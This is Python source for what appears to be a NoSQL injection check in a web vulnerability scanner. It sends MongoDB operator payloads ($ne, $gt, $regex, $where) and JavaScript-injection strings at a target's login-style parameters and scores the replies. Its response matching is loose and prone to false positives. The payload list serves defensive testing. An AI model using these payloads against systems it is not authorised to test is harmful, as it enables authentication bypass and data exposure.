import json
import urllib.parse
from typing import Dict, List, Optional
from app.utils.http_client import fetch_url


def scan_nosql_injection(scan_context: dict) -> dict:
    if not scan_context.get("url"):
        return {"error": "missing_url"}

    url = scan_context["url"]
    evidence = []
    is_vulnerable = False
    highest_confidence = 0.0

    nosql_payloads = {
        "mongodb": [
            {"username": {"$ne": ""}, "password": {"$ne": ""}},
            {"username": {"$ne": None}, "password": {"$ne": None}},
            {"$where": "this.password.length > 0"},
            {"$regex": ".*"},
            {"username": {"$gt": ""}},
            {"password": {"$gt": ""}},
            {"$or": [{"username": "admin"}, {"password": {"$regex": ".*"}}]},
            {"username": {"$in": ["admin", "root", "user"]}},
            {"$expr": {"$gte": ["$password", 1]}},
        ],
        "generic": [
            "'; return db.version(); //",
            "'; return db.getCollectionNames(); //",
            "1; return true",
            "true",
            "1==1",
            "admin' || '1'=='1",
            "admin' || 1==1",
            "{\"$ne\": null}",
            "{\"$gt\": \"\"}",
            "{\"$regex\": \".*\"}",
        ]
    }

    try:
        parsed_url = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed_url.query)

        common_auth_params = [
            'username', 'user', 'email', 'login', 'password', 'pass',
            'username_or_email', 'uid', 'user_id', 'token', 'key'
        ]

        test_params = list(params.keys())
        if not test_params:
            test_params = common_auth_params[:4]

        for param_name in test_params:
            for payload in nosql_payloads["mongodb"][:4]:
                json_payload = json.dumps(payload)

                test_params_dict = params.copy()
                test_params_dict[param_name] = [json_payload]

                new_query = urllib.parse.urlencode(test_params_dict, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                response = fetch_url(test_url, method="GET")
                if response:
                    vuln_data = analyze_nosql_response(
                        response.text, param_name, test_url, "json"
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.7:
                            is_vulnerable = True

                response = fetch_url(test_url, method="POST",
                                   headers={"Content-Type": "application/json"},
                                   data=json_payload)
                if response:
                    vuln_data = analyze_nosql_response(
                        response.text, param_name, test_url, "json_body"
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.7:
                            is_vulnerable = True

        for param_name in test_params:
            for payload in nosql_payloads["generic"][:4]:
                test_params_dict = params.copy()
                test_params_dict[param_name] = [payload]

                new_query = urllib.parse.urlencode(test_params_dict, doseq=True)
                test_url = urllib.parse.urlunparse((
                    parsed_url.scheme,
                    parsed_url.netloc,
                    parsed_url.path,
                    parsed_url.params,
                    new_query,
                    parsed_url.fragment
                ))

                response = fetch_url(test_url, method="GET")
                if response:
                    vuln_data = analyze_nosql_response(
                        response.text, param_name, test_url, "string"
                    )
                    if vuln_data and vuln_data.get('confidence', 0) > highest_confidence:
                        highest_confidence = vuln_data['confidence']
                        evidence.append(vuln_data)
                        if highest_confidence >= 0.7:
                            is_vulnerable = True

    except Exception as e:
        return {
            "vulnerability_type": "nosql_injection",
            "is_vulnerable": False,
            "severity": "info",
            "confidence": 0.0,
            "evidence": [{"type": "error", "value": f"Scanner error: {str(e)}"}],
            "recommendation": "An error occurred during NoSQL injection scanning."
        }

    severity = determine_severity(highest_confidence)

    return {
        "vulnerability_type": "nosql_injection",
        "is_vulnerable": is_vulnerable,
        "severity": severity,
        "confidence": highest_confidence,
        "evidence": evidence,
        "recommendation": get_nosql_recommendation(is_vulnerable, highest_confidence)
    }


def analyze_nosql_response(response_text: str, param_name: str, test_url: str, payload_type: str) -> Optional[Dict]:
    nosql_error_patterns = [
        "mongo",
        "mongodatabaseexception",
        "nosuchdocument",
        "nosql",
        "unexpected token",
        "invalid json",
        "json parse error",
        "bson",
        "objectid",
        "collection not found",
        "errmsg",
        "code:",
    ]

    success_patterns = [
        "logged in",
        "login successful",
        "welcome",
        "authenticated",
        "session",
        "token",
        "success",
        "true",
        "200",
    ]

    response_lower = response_text.lower()

    for pattern in nosql_error_patterns:
        if pattern in response_lower:
            return {
                "type": "error",
                "parameter": param_name,
                "payload_type": payload_type,
                "test_url": test_url,
                "evidence": f"NoSQL error detected: {pattern}",
                "confidence": 0.8
            }

    for pattern in success_patterns:
        if pattern in response_lower:
            return {
                "type": "auth_bypass",
                "parameter": param_name,
                "payload_type": payload_type,
                "test_url": test_url,
                "evidence": "Potential authentication bypass detected",
                "confidence": 0.6
            }

    return None


def determine_severity(confidence: float) -> str:
    if confidence >= 0.9:
        return "critical"
    elif confidence >= 0.7:
        return "high"
    elif confidence >= 0.5:
        return "medium"
    else:
        return "low"


def get_nosql_recommendation(is_vulnerable: bool, confidence: float) -> str:
    if not is_vulnerable:
        return "No NoSQL injection vulnerabilities detected. Continue following secure coding practices."

    if confidence >= 0.8:
        return ("CRITICAL: NoSQL Injection vulnerability confirmed. "
                "The application is vulnerable to NoSQL injection attacks. "
                "Immediate action required: "
                "1. Use parameterized queries for NoSQL databases. "
                "2. Validate and sanitize all user inputs. "
                "3. Implement strict type validation for input parameters. "
                "4. Apply principle of least privilege to database users. "
                "5. Enable database-level input validation.")
    else:
        return ("Potential NoSQL injection detected. "
                "Review NoSQL query construction, implement input validation, "
                "and use parameterized queries.")
